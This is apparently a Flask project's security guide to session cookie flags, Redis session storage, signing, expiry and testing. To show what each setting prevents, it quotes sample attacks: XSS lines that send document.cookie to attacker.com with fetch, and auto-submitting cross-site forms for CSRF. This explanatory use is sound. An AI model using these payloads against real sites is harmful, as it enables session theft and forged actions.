# Secure Cookie Configuration

## Overview

This document describes the secure cookie configuration for production environments. Proper cookie security is critical for protecting user sessions and preventing common web attacks like session hijacking, XSS-based session theft, and CSRF attacks.

## Cookie Security Settings

### Production Configuration

Secure cookie settings are configured in `config.py` under `ProductionConfig`:

```python
class ProductionConfig(Config):
    # Secure Cookie Settings
    SESSION_COOKIE_SECURE = True      # Only send cookies over HTTPS
    SESSION_COOKIE_HTTPONLY = True    # Prevent JavaScript access to cookies
    SESSION_COOKIE_SAMESITE = 'Lax'   # CSRF protection
    
    # Session Configuration
    SESSION_TYPE = 'redis'             # Use Redis for session storage
    SESSION_PERMANENT = False
    SESSION_USE_SIGNER = True          # Sign session cookies
    PERMANENT_SESSION_LIFETIME = timedelta(hours=24)
```

### Cookie Security Attributes

| Attribute | Value | Purpose |
|-----------|-------|---------|
| `SESSION_COOKIE_SECURE` | `True` | Ensures cookies are only transmitted over HTTPS |
| `SESSION_COOKIE_HTTPONLY` | `True` | Prevents JavaScript from accessing cookies (XSS protection) |
| `SESSION_COOKIE_SAMESITE` | `'Lax'` | CSRF protection, allows cookies in top-level navigation |
| `SESSION_TYPE` | `'redis'` | Stores sessions in Redis (server-side) instead of cookies |
| `SESSION_USE_SIGNER` | `True` | Cryptographically signs session cookies |
| `PERMANENT_SESSION_LIFETIME` | `24 hours` | Session expiration time |

## Cookie Security Attributes Explained

### 1. Secure Flag (`SESSION_COOKIE_SECURE`)

**Purpose:** Ensures cookies are only sent over encrypted HTTPS connections.

**How it works:**
```
HTTP Request:  Cookie NOT sent (insecure)
HTTPS Request: Cookie sent (secure)
```

**Security benefit:**
- Prevents cookie interception over unencrypted connections
- Protects against man-in-the-middle attacks
- Essential for session cookie security

**Configuration:**
```python
# Production (HTTPS required)
SESSION_COOKIE_SECURE = True

# Development (HTTP allowed)
SESSION_COOKIE_SECURE = False
```

**Testing:**
```bash
# Cookie sent over HTTPS
curl -b cookies.txt https://your-domain.com/

# Cookie NOT sent over HTTP (with Secure flag)
curl -b cookies.txt http://your-domain.com/
```

### 2. HttpOnly Flag (`SESSION_COOKIE_HTTPONLY`)

**Purpose:** Prevents JavaScript from accessing cookies via `document.cookie`.

**How it works:**
```javascript
// Without HttpOnly
console.log(document.cookie); // "session=abc123; user=john"

// With HttpOnly
console.log(document.cookie); // "" (HttpOnly cookies not visible)
```

**Security benefit:**
- Prevents XSS attacks from stealing session cookies
- Even if XSS vulnerability exists, attacker can't access session
- Critical defense-in-depth measure

**Configuration:**
```python
SESSION_COOKIE_HTTPONLY = True
```

**Attack scenario prevented:**
```javascript
// XSS payload attempting to steal cookie
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
// With HttpOnly: session cookie not accessible, attack fails
```

### 3. SameSite Attribute (`SESSION_COOKIE_SAMESITE`)

**Purpose:** Controls when cookies are sent with cross-site requests.

**Options:**

| Value | Behavior | Use Case |
|-------|----------|----------|
| `'Strict'` | Never sent in cross-site requests | Maximum security, may break workflows |
| `'Lax'` | Sent with top-level navigation (GET) | **Recommended balance** |
| `'None'` | Always sent (requires Secure flag) | Cross-site integrations only |

**How Lax works:**
```
Same-site request (user clicks link on your site):
  ✅ Cookie sent

Cross-site GET request (user clicks link from external site):
  ✅ Cookie sent (allows normal navigation)

Cross-site POST request (CSRF attempt):
  ❌ Cookie NOT sent (blocks CSRF)
```

**Configuration:**
```python
# Recommended for most applications
SESSION_COOKIE_SAMESITE = 'Lax'

# Maximum security (may break some workflows)
SESSION_COOKIE_SAMESITE = 'Strict'

# Only if you need cross-site cookies (requires HTTPS)
SESSION_COOKIE_SAMESITE = 'None'
SESSION_COOKIE_SECURE = True  # Required with 'None'
```

**CSRF Protection:**
```html
<!-- Attacker's site -->
<form action="https://your-site.com/transfer" method="POST">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>

<!-- With SameSite=Lax: Cookie not sent, CSRF fails -->
```

## Redis Session Backend

### Why Redis for Sessions?

**Benefits:**
1. **Server-side storage:** Session data not stored in cookies
2. **Scalability:** Supports multiple application instances
3. **Performance:** Fast in-memory storage
4. **Security:** Reduces cookie size and exposure
5. **Expiration:** Automatic session cleanup

### Redis Configuration

**1. Install Redis:**
```bash
# Ubuntu/Debian
sudo apt-get install redis-server

# macOS
brew install redis

# Docker
docker run -d -p 6379:6379 redis:alpine
```

**2. Configure Redis URL:**
```bash
# .env file
REDIS_URL=redis://localhost:6379/0

# Production (with password)
REDIS_URL=redis://:password@redis-host:6379/0

# Redis Sentinel (high availability)
REDIS_URL=redis+sentinel://sentinel-host:26379/mymaster/0
```

**3. Flask-Session Integration:**

Already configured in `app/__init__.py`:
```python
from flask_session import Session

session = Session()

def create_app(config_name='default'):
    app = Flask(__name__)
    
    # Initialize session only for non-testing environments
    if not app.config.get('TESTING'):
        session.init_app(app)
```

### Session Flow with Redis

**1. User Login:**
```
User logs in → Flask creates session → Session data stored in Redis
                                    ↓
                        Redis: session:abc123 → {user_id: 1, username: "john"}
                                    ↓
                        Cookie sent to browser: session=abc123 (only ID)
```

**2. Authenticated Request:**
```
Browser sends: session=abc123 → Flask looks up session:abc123 in Redis
                              ↓
                    Retrieves: {user_id: 1, username: "john"}
                              ↓
                    Request processed with user context
```

**3. Session Expiration:**
```
Redis TTL expires → Session data deleted → User must re-authenticate
```

### Redis Security Best Practices

**1. Require Authentication:**
```bash
# /etc/redis/redis.conf
requirepass YourStrongPasswordHere
```

**2. Bind to Localhost (if on same server):**
```bash
# /etc/redis/redis.conf
bind 127.0.0.1
```

**3. Enable TLS/SSL (production):**
```bash
# /etc/redis/redis.conf
tls-port 6379
port 0
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```

**4. Use Redis Sentinel or Cluster (high availability):**
```python
# config.py
REDIS_URL = 'redis+sentinel://sentinel1:26379,sentinel2:26379,sentinel3:26379/mymaster/0'
```

## Session Security Features

### 1. Session Signing (`SESSION_USE_SIGNER`)

**Purpose:** Cryptographically sign session cookies to prevent tampering.

**Configuration:**
```python
SESSION_USE_SIGNER = True
SECRET_KEY = 'your-secret-key-here'  # Must be strong and secret
```

**How it works:**
```
Original session ID: abc123
                ↓
Signed session ID: abc123.YXBwbmFtZQ.k7JH3kY9hEg
                           ↑         ↑
                      timestamp   signature
```

**Security benefit:**
- Prevents session ID tampering
- Detects modified cookies
- Requires SECRET_KEY to forge signatures

### 2. Session Lifetime (`PERMANENT_SESSION_LIFETIME`)

**Purpose:** Automatically expire sessions after a period of inactivity.

**Configuration:**
```python
from datetime import timedelta

# 24 hours
PERMANENT_SESSION_LIFETIME = timedelta(hours=24)

# 1 week
PERMANENT_SESSION_LIFETIME = timedelta(days=7)

# 2 hours (high security)
PERMANENT_SESSION_LIFETIME = timedelta(hours=2)
```

**Per-session control:**
```python
from flask import session

# Make session permanent (uses PERMANENT_SESSION_LIFETIME)
session.permanent = True

# Make session temporary (expires when browser closes)
session.permanent = False
```

### 3. Session Regeneration (Login)

**Purpose:** Prevent session fixation attacks.

**Implementation:**
```python
from flask import session
from flask_login import login_user

@bp.route('/login', methods=['POST'])
def login():
    user = User.query.filter_by(username=username).first()
    
    if user and user.check_password(password):
        # Clear old session
        session.clear()
        
        # Login user (Flask-Login handles session regeneration)
        login_user(user)
        
        # Regenerate session ID
        session.modified = True
        
        return redirect(url_for('admin.dashboard'))
```

**Security benefit:**
- Prevents session fixation attacks
- Attacker can't pre-set session ID
- New session created on successful login

## Testing Cookie Security

### 1. Verify Cookie Attributes

**Using Browser DevTools:**

1. Open DevTools (F12)
2. Go to Application/Storage tab
3. Expand Cookies
4. Select your domain
5. Verify attributes:
   - ✅ Secure: ☑
   - ✅ HttpOnly: ☑
   - ✅ SameSite: Lax

**Using curl:**
```bash
# Login and save cookies
curl -c cookies.txt -X POST https://your-domain.com/auth/login \
  -d "username=test&password=test"

# Check cookie attributes
cat cookies.txt
# Should see: #HttpOnly_your-domain.com TRUE / TRUE 0 session abc123
#                ↑                              ↑
#             HttpOnly                      Secure
```

### 2. Test Secure Flag

**Test 1: Cookie sent over HTTPS**
```bash
curl -b cookies.txt https://your-domain.com/admin/dashboard
# Should work (cookie sent)
```

**Test 2: Cookie NOT sent over HTTP**
```bash
curl -b cookies.txt http://your-domain.com/admin/dashboard
# Should fail (cookie not sent due to Secure flag)
```

### 3. Test HttpOnly Flag

**Test: JavaScript can't access cookie**
```javascript
// In browser console
console.log(document.cookie);
// Should NOT show session cookie (HttpOnly prevents access)
```

### 4. Test SameSite=Lax

**Test 1: Same-site request (should work)**
```html
<!-- On your-domain.com -->
<a href="/admin/dashboard">Dashboard</a>
<!-- Cookie sent ✅ -->
```

**Test 2: Cross-site POST (should fail)**
```html
<!-- On attacker-site.com -->
<form action="https://your-domain.com/transfer" method="POST">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
<!-- Cookie NOT sent (CSRF protection) ❌ -->
```

## Common Security Issues and Fixes

### Issue 1: Cookies Sent Over HTTP

**Problem:**
```
Cookie sent over HTTP → Intercepted by attacker
```

**Fix:**
```python
# config.py
class ProductionConfig(Config):
    SESSION_COOKIE_SECURE = True  # Force HTTPS
```

**Verify:**
```bash
curl -I https://your-domain.com | grep "Set-Cookie:"
# Should see: Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax
```

### Issue 2: XSS Cookie Theft

**Problem:**
```javascript
// XSS payload
<script>fetch('https://attacker.com/?c=' + document.cookie)</script>
```

**Fix:**
```python
SESSION_COOKIE_HTTPONLY = True  # Prevent JavaScript access
```

**Verify:**
```javascript
// In browser console
console.log(document.cookie);
// Session cookie should NOT appear
```

### Issue 3: CSRF Attacks

**Problem:**
```html
<!-- Attacker's site -->
<img src="https://your-site.com/delete-account">
<!-- If cookie sent, account deleted -->
```

**Fix:**
```python
SESSION_COOKIE_SAMESITE = 'Lax'  # Block cross-site requests

# Also implement CSRF tokens
WTF_CSRF_ENABLED = True
```

### Issue 4: Session Fixation

**Problem:**
```
Attacker sets session ID → Victim logs in with that ID → Attacker has access
```

**Fix:**
```python
from flask import session

@bp.route('/login', methods=['POST'])
def login():
    # Clear old session
    session.clear()
    
    # Login user
    login_user(user)
    
    # Force session regeneration
    session.modified = True
```

### Issue 5: Session Not Expiring

**Problem:**
```
User logs out but session still valid → Security risk
```

**Fix:**
```python
# config.py
PERMANENT_SESSION_LIFETIME = timedelta(hours=24)

# routes/auth.py
@bp.route('/logout')
def logout():
    logout_user()
    session.clear()  # Clear session data
    return redirect(url_for('auth.login'))
```

## Redis Session Monitoring

### 1. Monitor Active Sessions

```bash
# Connect to Redis
redis-cli

# Count active sessions
KEYS session:* | wc -l

# View session data
GET session:abc123

# Check session TTL
TTL session:abc123
```

### 2. Session Analytics

```python
# Create monitoring endpoint (admin only)
@bp.route('/admin/sessions')
@login_required
@admin_required
def view_sessions():
    import redis
    
    r = redis.from_url(current_app.config['REDIS_URL'])
    
    # Get all session keys
    session_keys = r.keys('session:*')
    
    # Count active sessions
    active_sessions = len(session_keys)
    
    return jsonify({
        'active_sessions': active_sessions,
        'keys': [key.decode() for key in session_keys[:10]]  # First 10
    })
```

### 3. Session Cleanup

```bash
# Clean up expired sessions (Redis handles automatically with TTL)
redis-cli KEYS "session:*" | xargs redis-cli DEL

# Monitor memory usage
redis-cli INFO memory
```

## Production Checklist

Session security checklist for production deployment:

- [ ] **Secure Flag:** `SESSION_COOKIE_SECURE = True`
- [ ] **HttpOnly Flag:** `SESSION_COOKIE_HTTPONLY = True`
- [ ] **SameSite:** `SESSION_COOKIE_SAMESITE = 'Lax'` (or 'Strict')
- [ ] **Session Backend:** `SESSION_TYPE = 'redis'`
- [ ] **Session Signing:** `SESSION_USE_SIGNER = True`
- [ ] **Strong SECRET_KEY:** Generated with `secrets.token_hex(32)`
- [ ] **Session Lifetime:** Appropriate for your application (e.g., 24 hours)
- [ ] **HTTPS Enabled:** Required for Secure flag to work
- [ ] **Redis Security:** Authentication, TLS, bind to localhost
- [ ] **Session Regeneration:** Implemented on login
- [ ] **Session Cleanup:** Redis TTL configured
- [ ] **CSRF Protection:** `WTF_CSRF_ENABLED = True`
- [ ] **Monitoring:** Session analytics and alerts set up
- [ ] **Testing:** All cookie attributes verified in production

## Environment Variables

Configure session security with environment variables:

```bash
# .env file

# Secret Keys (CRITICAL - use strong random values)
SECRET_KEY=your-generated-secret-key-here
JWT_SECRET_KEY=your-jwt-secret-key-here

# Redis
REDIS_URL=redis://:password@redis-host:6379/0

# Session Configuration
SESSION_TYPE=redis
SESSION_PERMANENT=false
PERMANENT_SESSION_LIFETIME_HOURS=24

# Cookie Security (Production)
SESSION_COOKIE_SECURE=true
SESSION_COOKIE_HTTPONLY=true
SESSION_COOKIE_SAMESITE=Lax
```

## Generating Secure SECRET_KEY

**Python:**
```python
import secrets

# Generate strong SECRET_KEY
secret_key = secrets.token_hex(32)
print(f"SECRET_KEY={secret_key}")

# Generate JWT secret
jwt_key = secrets.token_hex(32)
print(f"JWT_SECRET_KEY={jwt_key}")
```

**Bash:**
```bash
# Generate SECRET_KEY
python -c "import secrets; print(secrets.token_hex(32))"

# Or using openssl
openssl rand -hex 32
```

## Integration with Other Security Features

### Session Security + HSTS

```python
# HSTS ensures cookies only transmitted over HTTPS
class ProductionSecurityConfig(SecurityConfig):
    HSTS_ENABLED = True

class ProductionConfig(Config):
    SESSION_COOKIE_SECURE = True  # Works with HSTS
```

### Session Security + CSRF Protection

```python
# config.py
WTF_CSRF_ENABLED = True
SESSION_COOKIE_SAMESITE = 'Lax'  # Additional CSRF protection
```

### Session Security + Rate Limiting

```python
# Prevent session brute force
from flask_limiter import Limiter

@bp.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Session security + rate limiting
    ...
```

## References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [RFC 6265 - HTTP State Management Mechanism (Cookies)](https://tools.ietf.org/html/rfc6265)
- [MDN Web Docs - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [Flask-Session Documentation](https://flask-session.readthedocs.io/)
- [Redis Security](https://redis.io/topics/security)

## Support

For session security issues:
1. Verify cookie attributes in browser DevTools
2. Check Redis connectivity and authentication
3. Review security logs for session-related events
4. Test with curl to verify Secure flag behavior
5. Contact security team for production issues
